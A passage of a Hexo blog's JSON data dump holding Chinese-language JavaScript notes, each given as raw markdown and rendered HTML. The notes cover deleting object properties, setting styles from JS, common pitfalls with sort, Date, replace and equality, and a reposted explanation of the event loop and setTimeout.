把一个对象转换成json字符串， </span><br><span class=\"line\">JSON.parse()  // 把一个json字符串解析成对象。。</span><br></pre></td></tr></table></figure>\n"},{"title":"JS中删除对象属性","date":"2018-12-06T01:51:14.000Z","_content":"# JS中删除对象的属性\n通过 `delete` 关键字实现\n> delete xobj['anyKey'] ","source":"_posts/FrontEnd/JS/JS中删除对象属性.md","raw":"---\ntitle: JS中删除对象属性\ndate: 2018-12-06 09:51:14\ntags: Delete\ncategories: JavaScript\n---\n# JS中删除对象的属性\n通过 `delete` 关键字实现\n> delete xobj['anyKey'] ","slug":"FrontEnd/JS/JS中删除对象属性","published":1,"updated":"2018-12-06T02:01:55.276Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxz6008xzodvjehru38n","content":"<h1 id=\"JS中删除对象的属性\"><a href=\"#JS中删除对象的属性\" class=\"headerlink\" title=\"JS中删除对象的属性\"></a>JS中删除对象的属性</h1><p>通过 <code>delete</code> 关键字实现</p>\n<blockquote>\n<p>delete xobj[‘anyKey’] </p>\n</blockquote>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"JS中删除对象的属性\"><a href=\"#JS中删除对象的属性\" class=\"headerlink\" title=\"JS中删除对象的属性\"></a>JS中删除对象的属性</h1><p>通过 <code>delete</code> 关键字实现</p>\n<blockquote>\n<p>delete xobj[‘anyKey’] </p>\n</blockquote>\n"},{"title":"修改样式","date":"2018-05-29T02:15:08.000Z","_content":"## JS修改CSS样式\n\n### 1. `setAttribute`\n````\nlet evedd = sideMenu.children[i].getElementsByTagName('dd')[0]\n\nevedd.setAttribute('style', `height: 0px`)\n````\n\n### 2. `.style`\n````\ndocument.documentElement.style.fontSize\n    = document.documentElement.clientWidth / 3.75 + 'px';\n````","source":"_posts/FrontEnd/JS/JS修改样式.md","raw":"---\ntitle: 修改样式\ndate: 2018-05-29 10:15:08\ntags: JS修改样式\ncategories: JS修改CSS\n---\n## JS修改CSS样式\n\n### 1. `setAttribute`\n````\nlet evedd = sideMenu.children[i].getElementsByTagName('dd')[0]\n\nevedd.setAttribute('style', `height: 0px`)\n````\n\n### 2. `.style`\n````\ndocument.documentElement.style.fontSize\n    = document.documentElement.clientWidth / 3.75 + 'px';\n````","slug":"FrontEnd/JS/JS修改样式","published":1,"updated":"2018-09-05T06:33:18.453Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxz80090zodvuz5btokn","content":"<h2 id=\"JS修改CSS样式\"><a href=\"#JS修改CSS样式\" class=\"headerlink\" title=\"JS修改CSS样式\"></a>JS修改CSS样式</h2><h3 id=\"1-setAttribute\"><a href=\"#1-setAttribute\" class=\"headerlink\" title=\"1. setAttribute\"></a>1. <code>setAttribute</code></h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">let evedd = sideMenu.children[i].getElementsByTagName(&apos;dd&apos;)[0]</span><br><span class=\"line\"></span><br><span class=\"line\">evedd.setAttribute(&apos;style&apos;, `height: 0px`)</span><br></pre></td></tr></table></figure>\n<h3 id=\"2-style\"><a href=\"#2-style\" class=\"headerlink\" title=\"2. .style\"></a>2. <code>.style</code></h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">document.documentElement.style.fontSize</span><br><span class=\"line\">    = document.documentElement.clientWidth / 3.75 + &apos;px&apos;;</span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"","more":"<h2 id=\"JS修改CSS样式\"><a href=\"#JS修改CSS样式\" class=\"headerlink\" title=\"JS修改CSS样式\"></a>JS修改CSS样式</h2><h3 id=\"1-setAttribute\"><a href=\"#1-setAttribute\" class=\"headerlink\" title=\"1. setAttribute\"></a>1. <code>setAttribute</code></h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">let evedd = sideMenu.children[i].getElementsByTagName(&apos;dd&apos;)[0]</span><br><span class=\"line\"></span><br><span class=\"line\">evedd.setAttribute(&apos;style&apos;, `height: 0px`)</span><br></pre></td></tr></table></figure>\n<h3 id=\"2-style\"><a href=\"#2-style\" class=\"headerlink\" title=\"2. .style\"></a>2. <code>.style</code></h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">document.documentElement.style.fontSize</span><br><span class=\"line\">    = document.documentElement.clientWidth / 3.75 + &apos;px&apos;;</span><br></pre></td></tr></table></figure>"},{"title":"JS常见陷阱","date":"2018-05-05T02:36:51.000Z","archives":"JS","_content":"# JavaScript中8个常见的陷阱\n## 1. 数组元素排序\nJavaScript默认使用`字典序(alphanumeric)`来排序。因此，`[1,2,5,10].sort()`的结果是`[1, 10, 2, 5]`。\n\n如果你想正确的排序，应该这样做：`[1,2,5,10].sort((a, b) => a - b)`\n\n## 2. new Date()\n`new Date()`的使用方法有：\n+ 不接收任何参数：返回当前时间；\n+ 接收一个参数x: 返回1970年1月1日 + x毫秒的值。\n+ new Date(1, 1, 1)返回1901年2月1号。\n+ new Date(2016, 1, 1)不会在1900年的基础上加2016，而只是表示2016年。\n\n## 3. 替换函数(replace)\n\n    let s = \"bob\"\n    const replaced = s.replace('b', 'l')\n    replaced === \"lob\" // 只会替换掉第一个b\n    s === \"bob\" // 并且s的值不会变  \n\n如果想把所有`b`都替换掉，要使用正则：\n\n    \"bob\".replace(/b/g, 'l') === 'lol'\n\n## 4. 谨慎对待比较运算\n  // 这些可以\n  'abc' === 'abc' // true\n  1 === 1         // true\n  // 然而这些不行\n  [1,2,3] === [1,2,3] // false\n  {a: 1} === {a: 1}   // false\n  {} === {}           // false\n\n  因为`[1,2,3]`和[1,2,3]是两个不同的数组，只是它们的元素碰巧相同。因此，不能简单的通过===来判断。\n\n","source":"_posts/FrontEnd/JS/JS常见陷阱.md","raw":"---\ntitle: JS常见陷阱\ndate: 2018-05-05 10:36:51\ntags: JS常见坑\narchives: JS\ncategories: JS\n---\n# JavaScript中8个常见的陷阱\n## 1. 数组元素排序\nJavaScript默认使用`字典序(alphanumeric)`来排序。因此，`[1,2,5,10].sort()`的结果是`[1, 10, 2, 5]`。\n\n如果你想正确的排序，应该这样做：`[1,2,5,10].sort((a, b) => a - b)`\n\n## 2. new Date()\n`new Date()`的使用方法有：\n+ 不接收任何参数：返回当前时间；\n+ 接收一个参数x: 返回1970年1月1日 + x毫秒的值。\n+ new Date(1, 1, 1)返回1901年2月1号。\n+ new Date(2016, 1, 1)不会在1900年的基础上加2016，而只是表示2016年。\n\n## 3. 替换函数(replace)\n\n    let s = \"bob\"\n    const replaced = s.replace('b', 'l')\n    replaced === \"lob\" // 只会替换掉第一个b\n    s === \"bob\" // 并且s的值不会变  \n\n如果想把所有`b`都替换掉，要使用正则：\n\n    \"bob\".replace(/b/g, 'l') === 'lol'\n\n## 4. 谨慎对待比较运算\n  // 这些可以\n  'abc' === 'abc' // true\n  1 === 1         // true\n  // 然而这些不行\n  [1,2,3] === [1,2,3] // false\n  {a: 1} === {a: 1}   // false\n  {} === {}           // false\n\n  因为`[1,2,3]`和[1,2,3]是两个不同的数组，只是它们的元素碰巧相同。因此，不能简单的通过===来判断。\n\n","slug":"FrontEnd/JS/JS常见陷阱","published":1,"updated":"2018-09-05T06:33:18.454Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxzd0094zodvkf74fz26","content":"<h1 id=\"JavaScript中8个常见的陷阱\"><a href=\"#JavaScript中8个常见的陷阱\" class=\"headerlink\" title=\"JavaScript中8个常见的陷阱\"></a>JavaScript中8个常见的陷阱</h1><h2 id=\"1-数组元素排序\"><a href=\"#1-数组元素排序\" class=\"headerlink\" title=\"1. 数组元素排序\"></a>1. 数组元素排序</h2><p>JavaScript默认使用<code>字典序(alphanumeric)</code>来排序。因此，<code>[1,2,5,10].sort()</code>的结果是<code>[1, 10, 2, 5]</code>。</p>\n<p>如果你想正确的排序，应该这样做：<code>[1,2,5,10].sort((a, b) =&gt; a - b)</code></p>\n<h2 id=\"2-new-Date\"><a href=\"#2-new-Date\" class=\"headerlink\" title=\"2. new Date()\"></a>2. new Date()</h2><p><code>new Date()</code>的使用方法有：</p>\n<ul>\n<li>不接收任何参数：返回当前时间；</li>\n<li>接收一个参数x: 返回1970年1月1日 + x毫秒的值。</li>\n<li>new Date(1, 1, 1)返回1901年2月1号。</li>\n<li>new Date(2016, 1, 1)不会在1900年的基础上加2016，而只是表示2016年。</li>\n</ul>\n<h2 id=\"3-替换函数-replace\"><a href=\"#3-替换函数-replace\" class=\"headerlink\" title=\"3. 替换函数(replace)\"></a>3. 替换函数(replace)</h2><pre><code>let s = &quot;bob&quot;\nconst replaced = s.replace(&apos;b&apos;, &apos;l&apos;)\nreplaced === &quot;lob&quot; // 只会替换掉第一个b\ns === &quot;bob&quot; // 并且s的值不会变  \n</code></pre><p>如果想把所有<code>b</code>都替换掉，要使用正则：</p>\n<pre><code>&quot;bob&quot;.replace(/b/g, &apos;l&apos;) === &apos;lol&apos;\n</code></pre><h2 id=\"4-谨慎对待比较运算\"><a href=\"#4-谨慎对待比较运算\" class=\"headerlink\" title=\"4. 谨慎对待比较运算\"></a>4. 谨慎对待比较运算</h2><p>  // 这些可以<br>  ‘abc’ === ‘abc’ // true<br>  1 === 1         // true<br>  // 然而这些不行<br>  [1,2,3] === [1,2,3] // false<br>  {a: 1} === {a: 1}   // false<br>  {} === {}           // false</p>\n<p>  因为<code>[1,2,3]</code>和[1,2,3]是两个不同的数组，只是它们的元素碰巧相同。因此，不能简单的通过===来判断。</p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"JavaScript中8个常见的陷阱\"><a href=\"#JavaScript中8个常见的陷阱\" class=\"headerlink\" title=\"JavaScript中8个常见的陷阱\"></a>JavaScript中8个常见的陷阱</h1><h2 id=\"1-数组元素排序\"><a href=\"#1-数组元素排序\" class=\"headerlink\" title=\"1. 数组元素排序\"></a>1. 数组元素排序</h2><p>JavaScript默认使用<code>字典序(alphanumeric)</code>来排序。因此，<code>[1,2,5,10].sort()</code>的结果是<code>[1, 10, 2, 5]</code>。</p>\n<p>如果你想正确的排序，应该这样做：<code>[1,2,5,10].sort((a, b) =&gt; a - b)</code></p>\n<h2 id=\"2-new-Date\"><a href=\"#2-new-Date\" class=\"headerlink\" title=\"2. new Date()\"></a>2. new Date()</h2><p><code>new Date()</code>的使用方法有：</p>\n<ul>\n<li>不接收任何参数：返回当前时间；</li>\n<li>接收一个参数x: 返回1970年1月1日 + x毫秒的值。</li>\n<li>new Date(1, 1, 1)返回1901年2月1号。</li>\n<li>new Date(2016, 1, 1)不会在1900年的基础上加2016，而只是表示2016年。</li>\n</ul>\n<h2 id=\"3-替换函数-replace\"><a href=\"#3-替换函数-replace\" class=\"headerlink\" title=\"3. 替换函数(replace)\"></a>3. 替换函数(replace)</h2><pre><code>let s = &quot;bob&quot;\nconst replaced = s.replace(&apos;b&apos;, &apos;l&apos;)\nreplaced === &quot;lob&quot; // 只会替换掉第一个b\ns === &quot;bob&quot; // 并且s的值不会变  \n</code></pre><p>如果想把所有<code>b</code>都替换掉，要使用正则：</p>\n<pre><code>&quot;bob&quot;.replace(/b/g, &apos;l&apos;) === &apos;lol&apos;\n</code></pre><h2 id=\"4-谨慎对待比较运算\"><a href=\"#4-谨慎对待比较运算\" class=\"headerlink\" title=\"4. 谨慎对待比较运算\"></a>4. 谨慎对待比较运算</h2><p>  // 这些可以<br>  ‘abc’ === ‘abc’ // true<br>  1 === 1         // true<br>  // 然而这些不行<br>  [1,2,3] === [1,2,3] // false<br>  {a: 1} === {a: 1}   // false<br>  {} === {}           // false</p>\n<p>  因为<code>[1,2,3]</code>和[1,2,3]是两个不同的数组，只是它们的元素碰巧相同。因此，不能简单的通过===来判断。</p>\n"},{"title":"JS执行机制与异步回调","date":"2018-05-09T06:38:24.000Z","_content":"## [转][理解JavaScript 执行机制及异步回调(setTimeout/setInterval/Promise)](https://blog.csdn.net/haoaiqian/article/details/78622651)\n'`javascript执行机制`' / '`代码执行顺序`' / '`函数生命周期加载`' 等类似问题 都与`javascript执行机制`相关。\n\n## 1. 关于JavaScript\n`JavaScript` 是一门 `单线程语言`，在最新的`HTML5`中提出了`Web-Worker`，但`JS 是单线程`这一`核心仍未改变`。所以一切`JS 版的\"多线程\"都是用单线程模拟出来的`，一切 JavaScript `多线程` 都是`纸老虎`！\n\n## 2. JavaScript事件循环\n既然JS是`单线程`，排队 办理业务, `js任务`也要一个一个顺序执行。如 `任务耗时过长`，后一个任务必须等着。浏览新闻 超清图片加载慢 需要异步加载 任务分为两类：\n+ 同步任务\\\n打开网站，`网页渲染` 过程 就是 `同步任务`，比如 `页面骨架`和 `页面元素`的`渲染`。\n+ 异步任务\\\n  而 `加载 图片 音乐`之类`占用资源大耗时久`的任务，就是`异步任务`。\n  \n  关于这部分有严格的文字定义，但本文的目的是用最小的学习成本彻底弄懂执行机制，所以用导图来说明：\n  ![js事件循环机制](https://img-blog.csdn.net/20171124105726497?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvaGFvYWlxaWFu/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast)\n  \n  导图要表达的内容用文字来表述的话：<br>\n`同步`和`异步`任务分别进入不同的`执行”场所”`，`同步的进入主线程`，`异步的进入Event Table并注册函数`。当指定的事情`完成`时，`Event Table`会将这个`函数` `移入Event Queue`。`主线程`内的任务`执行完`毕为空，会去`Event Queue`读取对应的函数，进入主线程执行。\n\n  上述过程会不断重复，也就是所谓的 `Event Loop(事件循环)`。\n\n  我们不禁要问了，那`怎么知道`主线程执行栈为空啊？js引擎存在`monitoring process`进程，会`持续不断检查`主线程执行栈是否为空，`一旦为空`，就会去`Event Queue`那里检查是否有`等待被调用的函数`。 \n说了这么多文字，不如直接一段代码更直白：略\n\n## 3. [又爱又恨的setTimeout](https://juejin.im/post/59e85eebf265da430d571f89)\n\n大名鼎鼎的`setTimeout`无需再多言，大家对他的第一印象就是`异步`可以`延时执行`，我们经常这么实现延时3秒执行：\n````\nsetTimeout(() => {\n    console.log('延时3秒');\n},3000)\n````\n\n随着`setTimeout`使用的增加，问题也出现了，有时候明明写的延时3秒，实际却5，6秒才执行函数，这是为何？\n\n渐渐的setTimeout用的地方多了，问题也出现了，有时候明明写的延时3秒，实际却5，6秒才执行函数，这又咋回事啊？\n\n先看一个例子：\n````\nsetTimeout(() => {\n    task();\n},3000)\nconsole.log('执行console');\n````\n\n根据前面我们的结论，setTimeout是异步的，应该先执行console.log这个同步任务，所以我们的结论是：\n````\n//执行console\n//task()\n````\n\n去验证一下，结果正确！\n然后我们修改一下前面的代码：\n````\nsetTimeout(() => {\n    task()\n},3000)\n\nsleep(10000000)\n````\n乍一看其实差不多，但把这段代码在chrome执行一下，却发现控制台执行task()需要的时间远远超过3秒，为何需要这么长时间？\n\n这时候我们需要重新理解`setTimeout的定义`。我们先说上述代码是怎么执行的：\n\n+ `task()`进入Event Table并注册,计时开始。\n\n+ 执行`sleep`函数，很慢，非常慢，计时仍在继续。\n\n+ 3秒到了，计时事件`timeout`完成，`task()`进入`Event Queue`，但是`sleep`也太慢了吧，还没执行完，只好等着。\n\n+ `sleep`终于执行完了，`task()`终于从Event Queue进入了主线程执行。\n\n上述的流程走完，我们知道`setTimeout`这个函数，是经过指定时间后，把要执行的任务(本例中为`task()`)加入到Event Queue中，又因为是单线程任务要一个一个执行，如果前面的任务需要的时间太久，那么只能等着，导致真正的延迟时间远远大于3秒。\n","source":"_posts/FrontEnd/JS/JS执行机制与异步回调.md","raw":"---\ntitle: JS执行机制与异步回调\ndate: 2018-05-09 14:38:24\ntags: JS执行机制 异步回调\ncategories: JS\n---\n## [转][理解JavaScript 执行机制及异步回调(setTimeout/setInterval/Promise)](https://blog.csdn.net/haoaiqian/article/details/78622651)\n'`javascript执行机制`' / '`代码执行顺序`' / '`函数生命周期加载`' 等类似问题 都与`javascript执行机制`相关。\n\n## 1. 关于JavaScript\n`JavaScript` 是一门 `单线程语言`，在最新的`HTML5`中提出了`Web-Worker`，但`JS 是单线程`这一`核心仍未改变`。所以一切`JS 版的\"多线程\"都是用单线程模拟出来的`，一切 JavaScript `多线程` 都是`纸老虎`！\n\n## 2. JavaScript事件循环\n既然JS是`单线程`，排队 办理业务, `js任务`也要一个一个顺序执行。如 `任务耗时过长`，后一个任务必须等着。浏览新闻 超清图片加载慢 需要异步加载 任务分为两类：\n+ 同步任务\\\n打开网站，`网页渲染` 过程 就是 `同步任务`，比如 `页面骨架`和 `页面元素`的`渲染`。\n+ 异步任务\\\n  而 `加载 图片 音乐`之类`占用资源大耗时久`的任务，就是`异步任务`。\n  \n  关于这部分有严格的文字定义，但本文的目的是用最小的学习成本彻底弄懂执行机制，所以用导图来说明：\n  ![js事件循环机制](https://img-blog.csdn.net/20171124105726497?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvaGFvYWlxaWFu/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast)\n  \n  导图要表达的内容用文字来表述的话：<br>\n`同步`和`异步`任务分别进入不同的`执行”场所”`，`同步的进入主线程`，`异步的进入Event Table并注册函数`。当指定的事情`完成`时，`Event Table`会将这个`函数` `移入Event Queue`。`主线程`内的任务`执行完`毕为空，会去`Event Queue`读取对应的函数，进入主线程执行。\n\n  上述过程会不断重复，也就是所谓的 `Event Loop(事件循环)`。\n\n  我们不禁要问了，那`怎么知道`主线程执行栈为空啊？js引擎存在`monitoring process`进程，会`持续不断检查`主线程执行栈是否为空，`一旦为空`，就会去`Event Queue`那里检查是否有`等待被调用的函数`。 \n说了这么多文字，不如直接一段代码更直白：略\n\n## 3. [又爱又恨的setTimeout](https://juejin.im/post/59e85eebf265da430d571f89)\n\n大名鼎鼎的`setTimeout`无需再多言，大家对他的第一印象就是`异步`可以`延时执行`，我们经常这么实现延时3秒执行：\n````\nsetTimeout(() => {\n    console.log('延时3秒');\n},3000)\n````\n\n随着`setTimeout`使用的增加，问题也出现了，有时候明明写的延时3秒，实际却5，6秒才执行函数，这是为何？\n\n渐渐的setTimeout用的地方多了，问题也出现了，有时候明明写的延时3秒，实际却5，6秒才执行函数，这又咋回事啊？\n\n先看一个例子：\n````\nsetTimeout(() => {\n    task();\n},3000)\nconsole.log('执行console');\n````\n\n根据前面我们的结论，setTimeout是异步的，应该先执行console.log这个同步任务，所以我们的结论是：\n````\n//执行console\n//task()\n````\n\n去验证一下，结果正确！\n然后我们修改一下前面的代码：\n````\nsetTimeout(() => {\n    task()\n},3000)\n\nsleep(10000000)\n````\n乍一看其实差不多，但把这段代码在chrome执行一下，却发现控制台执行task()需要的时间远远超过3秒，为何需要这么长时间？\n\n这时候我们需要重新理解`setTimeout的定义`。我们先说上述代码是怎么执行的：\n\n+ `task()`进入Event Table并注册,计时开始。\n\n+ 执行`sleep`函数，很慢，非常慢，计时仍在继续。\n\n+ 3秒到了，计时事件`timeout`完成，`task()`进入`Event Queue`，但是`sleep`也太慢了吧，还没执行完，只好等着。\n\n+ `sleep`终于执行完了，`task()`终于从Event Queue进入了主线程执行。\n\n上述的流程走完，我们知道`setTimeout`这个函数，是经过指定时间后，把要执行的任务(本例中为`task()`)加入到Event Queue中，又因为是单线程任务要一个一个执行，如果前面的任务需要的时间太久，那么只能等着，导致真正的延迟时间远远大于3秒。\n","slug":"FrontEnd/JS/JS执行机制与异步回调","published":1,"updated":"2018-09-05T06:33:18.455Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxzg0097zodvnbfygwhf","content":"<h2 id=\"转-理解JavaScript-执行机制及异步回调-setTimeout-setInterval-Promise\"><a href=\"#转-理解JavaScript-执行机制及异步回调-setTimeout-setInterval-Promise\" class=\"headerlink\" title=\"[转]理解JavaScript 执行机制及异步回调(setTimeout/setInterval/Promise)\"></a>[转]<a href=\"https://blog.csdn.net/haoaiqian/article/details/78622651\" target=\"_blank\" rel=\"noopener\">理解JavaScript 执行机制及异步回调(setTimeout/setInterval/Promise)</a></h2><p>‘<code>javascript执行机制</code>‘ / ‘<code>代码执行顺序</code>‘ / ‘<code>函数生命周期加载</code>‘ 等类似问题 都与<code>javascript执行机制</code>相关。</p>\n<h2 id=\"1-关于JavaScript\"><a href=\"#1-关于JavaScript\" class=\"headerlink\" title=\"1. 关于JavaScript\"></a>1. 关于JavaScript</h2><p><code>JavaScript</code> 是一门 <code>单线程语言</code>，在最新的<code>HTML5</code>中提出了<code>Web-Worker</code>，但<code>JS 是单线程</code>这一<code>核心仍未改变</code>。所以一切<code>JS 版的&quot;多线程&quot;都是用单线程模拟出来的</code>，一切 JavaScript <code>多线程</code> 都是<code>纸老虎</code>！</p>\n<h2 id=\"2-JavaScript事件循环\"><a href=\"#2-JavaScript事件循环\" class=\"headerlink\" title=\"2. JavaScript事件循环\"></a>2. JavaScript事件循环</h2><p>既然JS是<code>单线程</code>，排队 办理业务, <code>js任务</code>也要一个一个顺序执行。如 <code>任务耗时过长</code>，后一个任务必须等着。浏览新闻 超清图片加载慢 需要异步加载 任务分为两类：</p>\n<ul>\n<li>同步任务\\<br>打开网站，<code>网页渲染</code> 过程 就是 <code>同步任务</code>，比如 <code>页面骨架</code>和 <code>页面元素</code>的<code>渲染</code>。</li>\n<li><p>异步任务\\<br>而 <code>加载 图片 音乐</code>之类<code>占用资源大耗时久</code>的任务，就是<code>异步任务</code>。</p>\n<p>关于这部分有严格的文字定义，但本文的目的是用最小的学习成本彻底弄懂执行机制，所以用导图来说明：<br><img src=\"https://img-blog.csdn.net/20171124105726497?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvaGFvYWlxaWFu/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast\" alt=\"js事件循环机制\"></p>\n<p>导图要表达的内容用文字来表述的话：<br><br><code>同步</code>和<code>异步</code>任务分别进入不同的<code>执行”场所”</code>，<code>同步的进入主线程</code>，<code>异步的进入Event Table并注册函数</code>。当指定的事情<code>完成</code>时，<code>Event Table</code>会将这个<code>函数</code> <code>移入Event Queue</code>。<code>主线程</code>内的任务<code>执行完</code>毕为空，会去<code>Event Queue</code>读取对应的函数，进入主线程执行。</p>\n<p>上述过程会不断重复，也就是所谓的 <code>Event Loop(事件循环)</code>。</p>\n<p>我们不禁要问了，那<code>怎么知道</code>主线程执行栈为空啊？js引擎存在<code>monitoring process</code>进程，会<code>持续不断检查</code>主线程执行栈是否为空，<code>一旦为空</code>，就会去<code>Event Queue</code>那里检查是否有<code>等待被调用的函数</code>。<br>说了这么多文字，不如直接一段代码更直白：略</p>\n</li>\n</ul>\n<h2 id=\"3-又爱又恨的setTimeout\"><a href=\"#3-又爱又恨的setTimeout\" class=\"headerlink\" title=\"3. 又爱又恨的setTimeout\"></a>3. <a href=\"https://juejin.im/post/59e85eebf265da430d571f89\" target=\"_blank\" rel=\"noopener\">又爱又恨的setTimeout</a></h2><p>大名鼎鼎的<code>setTimeout</code>无需再多言，大家对他的第一印象就是<code>异步</code>可以<code>延时执行</code>，我们经常这么实现延时3秒执行：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">setTimeout(() =&gt; &#123;</span><br><span class=\"line\">    console.log(&apos;延时3秒&apos;);</span><br><span class=\"line\">&#125;,3000)</span><br></pre></td></tr></table></figure></p>\n<p>随着<code>setTimeout</code>使用的增加，问题也出现了，有时候明明写的延时3秒，实际却5，6秒才执行函数，这是为何？</p>\n<p>渐渐的setTimeout用的地方多了，问题也出现了，有时候明明写的延时3秒，实际却5，6秒才执行函数，这又咋回事啊？</p>\n<p>先看一个例子：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">setTimeout(() =&gt; &#123;</span><br><span class=\"line\">    task();</span><br><span class=\"line\">&#125;,3000)</span><br><span class=\"line\">console.log(&apos;执行console&apos;);</span><br></pre></td></tr></table></figure></p>\n<p>根据前面我们的结论，setTimeout是异步的，应该先执行console.log这个同步任务，所以我们的结论是：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//执行console</span><br><span class=\"line\">//task()</span><br></pre></td></tr></table></figure></p>\n<p>去验证一下，结果正确！<br>然后我们修改一下前面的代码：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">setTimeout(() =&gt; &#123;</span><br><span class=\"line\">    task()</span><br><span class=\"line\">&#125;,3000)</span><br><span class=\"line\"></span><br><span class=\"line\">sleep(10000000)</span><br></pre></td></tr></table></figure></p>\n<p>乍一看其实差不多，但把这段代码在chrome执行一下，却发现控制台执行task()需要的时间远远超过3秒，为何需要这么长时间？</p>\n<p>这时候我们需要重新理解<code>setTimeout的定义</code>。我们先说上述代码是怎么执行的：</p>\n<ul>\n<li><p><code>task()</code>进入Event Table并注册,计时开始。</p>\n</li>\n<li><p>执行<code>sleep</code>函数，很慢，非常慢，计时仍在继续。</p>\n</li>\n<li><p>3秒到了，计时事件<code>timeout</code>完成，<code>task()</code>进入<code>Event Queue</code>，但是<code>sleep</code>也太慢了吧，还没执行完，只好等着。</p>\n</li>\n<li><p><code>sleep</code>终于执行完了，<code>task()</code>终于从Event Queue进入了主线程执行。</p>\n</li>\n</ul>\n<p>上述的流程走完，我们知道<code>setTimeout</code>这个函数，是经过指定时间后，把要执行的任务(本例中为<code>task()</code>)加入到Event Queue中，又因为是单线程任务要一个一个执行，如果前面的任务需要的时间太久，那么只能等着，导致真正的延迟时间远远大于3秒。</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"转-理解JavaScript-执行机制及异步回调-setTimeout-setInterval-Promise\"><a href=\"#转-理解JavaScript-执行机制及异步回调-setTimeout-setInterval-Promise\" class=\"headerlink\" title=\"[转]理解JavaScript 执行机制及异步回调(setTimeout/setInterval/Promise)\"></a>[转]<a href=\"https://blog.csdn.net/haoaiqian/article/details/78622651\" target=\"_blank\" rel=\"noopener\">理解JavaScript 执行机制及异步回调(setTimeout/setInterval/Promise)</a></h2><p>‘<code>javascript执行机制</code>‘ / ‘<code>代码执行顺序</code>‘ / ‘<code>函数生命周期加载</code>‘ 等类似问题 都与<code>javascript执行机制</code>相关。</p>\n<h2 id=\"1-关于JavaScript\"><a href=\"#1-关于JavaScript\" class=\"headerlink\" title=\"1. 关于JavaScript\"></a>1. 关于JavaScript</h2><p><code>JavaScript</code> 是一门 <code>单线程语言</code>，在最新的<code>HTML5</code>中提出了<code>Web-Worker</code>，但<code>JS 是单线程</code>这一<code>核心仍未改变</code>。所以一切<code>JS 版的&quot;多线程&quot;都是用单线程模拟出来的</code>，一切 JavaScript <code>多线程</code> 都是<code>纸老虎</code>！</p>\n<h2 id=\"2-JavaScript事件循环\"><a href=\"#2-JavaScript事件循环\" class=\"headerlink\" title=\"2. JavaScript事件循环\"></a>2. JavaScript事件循环</h2><p>既然JS是<code>单线程</code>，排队 办理业务, <code>js任务</code>也要一个一个顺序执行。如 <code>任务耗时过长</code>，后一个任务必须等着。浏览新闻 超清图片加载慢 需要异步加载 任务分为两类：</p>\n<ul>\n<li>同步任务\\<br>打开网站，<code>网页渲染</code> 过程 就是 <code>同步任务</code>，比如 <code>页面骨架</code>和 <code>页面元素</code>的<code>渲染</code>。</li>\n<li><p>异步任务\\<br>而 <code>加载 图片 音乐</code>之类<code>占用资源大耗时久</code>的任务，就是<code>异步任务</code>。</p>\n<p>关于这部分有严格的文字定义，但本文的目的是用最小的学习成本彻底弄懂执行机制，所以用导图来说明：<br><img src=\"https://img-blog.csdn.net/20171124105726497?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvaGFvYWlxaWFu/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast\" alt=\"js事件循环机制\"></p>\n<p>导图要表达的内容用文字来表述的话：<br><br><code>同步</code>和<code>异步</code>任务分别进入不同的<code>执行”场所”</code>，<code>同步的进入主线程</code>，<code>异步的进入Event Table并注册函数</code>。当指定的事情<code>完成</code>时，<code>Event Table</code>会将这个<code>函数</code> <code>移入Event Queue</code>。<code>主线程</code>内的任务<code>执行完</code>毕为空，会去<code>Event Queue</code>读取对应的函数，进入主线程执行。</p>\n<p>上述过程会不断重复，也就是所谓的 <code>Event Loop(事件循环)</code>。</p>\n<p>我们不禁要问了，那<code>怎么知道</code>主线程执行栈为空啊？js引擎存在<code>monitoring process</code>进程，会<code>持续不断检查</code>主线程执行栈是否为空，<code>一旦为空</code>，就会去<code>Event Queue</code>那里检查是否有<code>等待被调用的函数</code>。<br>说了这么多文字，不如直接一段代码更直白：略</p>\n</li>\n</ul>\n<h2 id=\"3-又爱又恨的setTimeout\"><a href=\"#3-又爱又恨的setTimeout\" class=\"headerlink\" title=\"3. 又爱又恨的setTimeout\"></a>3. 